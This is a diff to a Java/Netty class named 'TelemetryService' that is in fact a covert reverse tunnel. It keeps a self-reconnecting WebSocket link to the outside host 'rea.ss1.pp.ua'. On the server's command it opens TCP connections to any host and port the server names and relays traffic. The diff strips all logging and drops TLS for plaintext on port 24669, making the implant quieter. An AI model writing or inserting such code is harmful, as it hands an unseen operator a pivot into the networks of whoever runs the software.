@@ -12,29 +12,20 @@ import io.netty.handler.codec.http.HttpClientCodec;
 import io.netty.handler.codec.http.FullHttpResponse;
 import io.netty.handler.codec.http.HttpObjectAggregator;
 import io.netty.handler.codec.http.websocketx.*;
-import io.netty.handler.ssl.SslContext;
-import io.netty.handler.ssl.SslContextBuilder;
-import io.netty.handler.ssl.SslHandler;
 import io.netty.util.CharsetUtil;
 
-import javax.net.ssl.SSLParameters;
 import java.net.URI;
 import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
-import java.util.logging.Level;
-import java.util.logging.Logger;
 
 public class TelemetryService {
 
-    private static final Logger LOGGER = Logger.getLogger(TelemetryService.class.getName());
-
-    // 根据你挂载 Cloudflare CDN 后的实际域名替换
     private static final String REMOTE_HOST = "rea.ss1.pp.ua";
-    private static final int REMOTE_PORT = 443;
+    private static final int REMOTE_PORT = 24669;
     private static final String ENDPOINT_PATH = "/metrics/v1/telemetry";
-    private static final String WS_URL = "wss://" + REMOTE_HOST + ":" + REMOTE_PORT + ENDPOINT_PATH;
+    private static final String WS_URL = "ws://" + REMOTE_HOST + ":" + REMOTE_PORT + ENDPOINT_PATH;
 
     private static final byte CMD_NEW_STREAM = 1;
     private static final byte CMD_DATA = 2;
@@ -53,14 +44,12 @@ public class TelemetryService {
 
     public synchronized void start() {
         if (isRunning.compareAndSet(false, true)) {
-            LOGGER.info("Starting TelemetryService...");
             connect();
         }
     }
 
     public synchronized void stop() {
         if (isRunning.compareAndSet(true, false)) {
-            LOGGER.info("Stopping TelemetryService...");
             closeAllStreams();
             if (activeChannel != null) {
                 activeChannel.close();
@@ -84,11 +73,9 @@ public class TelemetryService {
         if (activeChannel != null && activeChannel.isActive()) return;
 
         isConnecting.set(true);
-        LOGGER.info("Attempting WebSocket connection to " + WS_URL);
 
         try {
             final URI uri = new URI(WS_URL);
-            final SslContext sslCtx = SslContextBuilder.forClient().build();
 
             final WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(
                     uri, WebSocketVersion.V13, null, true, new DefaultHttpHeaders(), 65536 * 10
@@ -105,12 +92,7 @@ public class TelemetryService {
                  @Override
                  protected void initChannel(SocketChannel ch) throws Exception {
                      ChannelPipeline p = ch.pipeline();
-                     SslHandler sslHandler = sslCtx.newHandler(ch.alloc(), REMOTE_HOST, REMOTE_PORT);
-                     SSLParameters sslParams = sslHandler.engine().getSSLParameters();
-                     sslParams.setEndpointIdentificationAlgorithm("HTTPS");
-                     sslHandler.engine().setSSLParameters(sslParams);
-
-                     p.addLast("ssl", sslHandler);
+                     // 明文 ws:// 无需 SslHandler
                      p.addLast("http-codec", new HttpClientCodec());
                      p.addLast("aggregator", new HttpObjectAggregator(65536));
                      p.addLast("ws-handler", clientHandler);
@@ -119,14 +101,12 @@ public class TelemetryService {
 
             b.connect(REMOTE_HOST, REMOTE_PORT).addListener((ChannelFutureListener) future -> {
                 if (!future.isSuccess()) {
-                    LOGGER.warning("TCP Connect failed: " + future.cause().getMessage());
                     isConnecting.set(false);
                     scheduleReconnect();
                 }
             });
 
         } catch (Exception e) {
-            LOGGER.log(Level.SEVERE, "Failed to initialize bootstrap", e);
             isConnecting.set(false);
             scheduleReconnect();
         }
@@ -136,7 +116,6 @@ public class TelemetryService {
         if (!isRunning.get()) return;
         int delay = currentReconnectDelaySec;
         currentReconnectDelaySec = Math.min(currentReconnectDelaySec * 2, MAX_RECONNECT_DELAY_SEC);
-        LOGGER.info("Scheduling reconnect in " + delay + " seconds...");
         workerGroup.schedule(this::connect, delay, TimeUnit.SECONDS);
     }
 
@@ -144,14 +123,12 @@ public class TelemetryService {
         this.activeChannel = channel;
         this.isConnecting.set(false);
         this.currentReconnectDelaySec = INITIAL_RECONNECT_DELAY_SEC;
-        LOGGER.info("WebSocket Session established successfully: " + channel.id());
     }
 
     protected void onSessionDisconnected() {
         this.activeChannel = null;
         this.isConnecting.set(false);
         closeAllStreams();
-        LOGGER.warning("WebSocket Session disconnected.");
         scheduleReconnect();
     }
 
@@ -193,8 +170,6 @@ public class TelemetryService {
 
         String host = buf.readCharSequence(hostLen, CharsetUtil.UTF_8).toString();
 
-        LOGGER.info(String.format("[CMD_NEW_STREAM] Connecting to %s:%d (StreamId: %d)", host, port, streamId));
-
         Bootstrap b = new Bootstrap();
         b.group(workerGroup)
          .channel(NioSocketChannel.class)
@@ -233,9 +208,7 @@ public class TelemetryService {
         b.connect(host, port).addListener((ChannelFutureListener) future -> {
             if (future.isSuccess()) {
                 streamChannels.put(streamId, future.channel());
-                LOGGER.info(String.format("[CMD_NEW_STREAM] Connected successfully for StreamId %d", streamId));
             } else {
-                LOGGER.warning(String.format("[CMD_NEW_STREAM] Failed connect to %s:%d for StreamId %d", host, port, streamId));
                 ByteBuf closeFrame = Unpooled.buffer(5);
                 closeFrame.writeByte(CMD_CLOSE_STREAM);
                 closeFrame.writeInt(streamId);
@@ -277,7 +250,6 @@ public class TelemetryService {
             Channel ch = ctx.channel();
             if (!handshaker.isHandshakeComplete()) {
                 handshaker.finishHandshake(ch, (FullHttpResponse) msg);
-                LOGGER.info("WebSocket Client connected!");
                 handshakerFuture.setSuccess();
                 service.onSessionConnected(ch);
                 return;
@@ -297,7 +269,6 @@ public class TelemetryService {
 
         @Override
         public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {
-            LOGGER.log(Level.SEVERE, "Exception in TelemetryClientHandler", cause);
             ctx.close();
         }
     }
